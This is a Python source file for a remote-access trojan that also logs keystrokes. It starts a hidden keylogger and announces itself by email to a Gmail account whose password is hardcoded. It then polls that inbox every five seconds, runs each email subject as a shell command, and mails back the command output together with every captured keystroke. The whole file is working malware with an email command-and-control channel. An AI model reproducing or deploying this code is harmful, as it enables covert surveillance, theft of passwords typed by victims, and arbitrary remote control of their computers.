import os 
import pastebin
from pastebin import PastebinAPI
import smtplib
import poplib
import subprocess
from subprocess import check_output
from threading import Thread
from email.parser import Parser
from time import sleep
from pynput.keyboard import Key, Listener


loggedKeys = ""

def on_press(key):
    global loggedKeys
    if key == Key.shift or key == Key.ctrl_l or key == Key.ctrl_r or key == Key.shift_r:
        loggedKeys += '{0} Pressed'.format(key)
    else:
        loggedKeys += '{0}'.format(key)

def on_release(key):
    global loggedKeys
    if key == Key.shift or key == Key.ctrl_l or key == Key.ctrl_r or key == Key.shift_r:
        loggedKeys += '{0} Released'.format(key)
    if key == Key.enter:
        loggedKeys += '\n'

def startListener():
    # Collect events until released
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

def list_files(home):
    ret = ""
    for root, dirs, files in os.walk(home):
        level = root.replace(home, '').count(os.sep)
        indent = ' ' * 4 * (level)
        ret += (('{}{}/'.format(indent, os.path.basename(root))) + "\n")
        subindent = ' ' * 4 * (level + 1)
        for f in files:
            ret += (('{}{}'.format(subindent, f)) + "\n")
    return ret
               
if __name__ == "__main__":
    # start keylogger thread
    Thread(target=startListener).start()
    try:
        from subprocess import DEVNULL
    except ImportError:
        DEVNULL = os.open(os.devnull, os.O_RDWR)
    # send a mail
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    server.starttls()
    server.login("QjaDFvk1@gmail.com", "ddgfz#@ze18zlk3ga")
    server.sendmail("you@gmail.com", "QjaDFvk1@gmail.com", "\n" + "Irofane online.")
    server.close()

    while(True):
        sleep(5)
        email = "QjaDFvk1@gmail.com"
        password = "ddgfz#@ze18zlk3ga"
        server = poplib.POP3_SSL("pop.gmail.com")
        server.user(email)
        server.pass_(password)
        # list() function return all email list
        resp, mails, octets = server.list()
        print(mails)
        # get latest mail content
        index = len(mails)
        if index > 0:
            resp, lines, octets = server.retr(index)
            msg_content = b'\r\n'.join(lines).decode('utf-8')

            # now parse out the email object.
            msg = Parser().parsestr(msg_content)
            email_subject = msg.get('Subject')
            server.quit()

            # play commands
            home = os.path.expanduser("~")
            try:
                out = check_output(email_subject.split(" "), shell=True, stdin=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception as e:
                out = "command couldn't be executed : " + str(e)
            
            out += "\n\nlogged keys : \n " + str(loggedKeys)

            # send a mail
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.ehlo()
            server.starttls()
            server.login("QjaDFvk1@gmail.com", "ddgfz#@ze18zlk3ga")
            server.sendmail("you@gmail.com", "QjaDFvk1@gmail.com", "\n" + str(out))
            server.close()
